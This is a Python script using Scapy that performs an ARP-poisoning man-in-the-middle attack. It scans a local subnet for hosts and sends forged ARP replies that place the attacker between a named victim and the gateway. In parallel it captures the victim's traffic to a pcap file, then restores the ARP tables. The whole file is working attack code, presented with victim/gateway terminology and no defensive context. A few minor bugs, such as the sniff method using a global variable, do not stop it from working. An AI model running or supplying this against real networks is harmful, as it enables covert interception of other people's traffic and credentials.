#!/usr/bin/env python3

from cryptography.utils import CryptographyDeprecationWarning
import warnings
warnings.filterwarnings("ignore",category=CryptographyDeprecationWarning)
from scapy.all import *
import os
import sys
import time
from multiprocessing import Process


SUBNET = '192.168.43.0/24'
pkt,_ = arping(SUBNET,verbose=False)
# print(f"Fetching HW Address of devices in {SUBNET} ..")
for i in pkt:
	print(f'[+] Found : hwaddr : {i[1].getlayer(ARP).hwsrc} => ({i[1].getlayer(ARP).psrc})')


def get_mac(targetIP):
	packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has",pdst=targetIP)
	rsp,_ = srp(packet,timeout=2,retry=10,verbose=False)
	for _,r in rsp:
		return r[Ether].src
	return None


class Arper:
	def __init__(self,victim,gateway,iface='enp0s3'):
		self.victim = victim
		self.victimmac= get_mac(victim)
		self.gateway = gateway
		self.gatewaymac = get_mac(gateway)
		self.iface = iface
		conf.iface = iface
		conf.verb = 0

		print(f'[+] Initialized {self.iface}')
		print(f'[->] Gateway ({gateway}) is at ({self.gatewaymac})')
		print(f'[->] Victim ({victim}) is at ({self.victimmac})')
		print('-'*30)

	def run(self):
		# will do parallel sniffing and poisioning of data
		self.poison_thread = Process(target=self.poison)
		self.poison_thread.start()

		self.poison_sniff = Process(target=self.sniff)
		self.poison_sniff.start()


	def poison(self):
		poison_victim = ARP()
		poison_victim.op = 2
		poison_victim.psrc = self.gateway
		poison_victim.pdst = self.victim
		poison_victim.hwdst = self.victimmac
		print(f'ip src: {poison_victim.psrc}')
		print(f'ip dst: {poison_victim.pdst}')
		print(f'mac dst: {poison_victim.hwdst}')
		print(f'mac src: {poison_victim.hwsrc}')
		print(poison_victim.summary())
		print('-'*30)

		poison_gateway = ARP()
		poison_gateway.op = 2
		poison_gateway.psrc = self.victim
		poison_gateway.pdst = self.gateway
		poison_gateway.hwdst = self.gatewaymac
		print(f'ip src: {poison_gateway.psrc}')
		print(f'ip dst: {poison_gateway.pdst}')
		print(f'mac dst: {poison_gateway.hwdst}')
		print(f'mac src: {poison_gateway.hwsrc}')
		print(poison_gateway.summary())
		print('-'*30)

		print("\n[+] Poisioning: Press Crtl+C to stop ---")
		while True:
				sys.stdout.write('.')
				sys.stdout.flush()
				try:
					send(poison_victim)
					send(poison_gateway)
				except:
					print("[*] Poisioning stopped ..")
					print('[++] Restoring ARP Tables for both victim and gateway .')
					self.restore()
					sys.exit()
				else:
					time.sleep(2)


	def sniff(self,count=200):
		time.sleep(5)		
		print(f'Sniffing {count} packets --')
		bpf_filter = "ip host %s" % victim
		pkts = sniff(filter=bpf_filter,iface=self.iface,count=count)
		wrpcap('arper.pcap',pkts)
		print("Captured packets and wrote it to file in the current directory .")
		self.restore()
		self.poison_thread.terminate()
		print("FINISHED")
		

	def restore(self):
		print("[++] Restoring ARP Tables ..")
		send(ARP(
			op=2,
			psrc=self.gateway,
			hwsrc=self.gatewaymac,
			pdst=self.victim,
			hwdst='ff:ff:ff:ff:ff:ff',
			count=5
			))
		send(ARP(
			op=2,
			psrc=self.victim,
			hwsrc=self.victimmac,
			pdst=self.gateway,
			hwdst='ff:ff:ff:ff:ff:ff',
			count=5
			))

if __name__ == '__main__':
	(victim,gateway,iface) = (sys.argv[1],sys.argv[2],sys.argv[3])
	myarp = Arper(victim,gateway,iface)
	myarp.run()
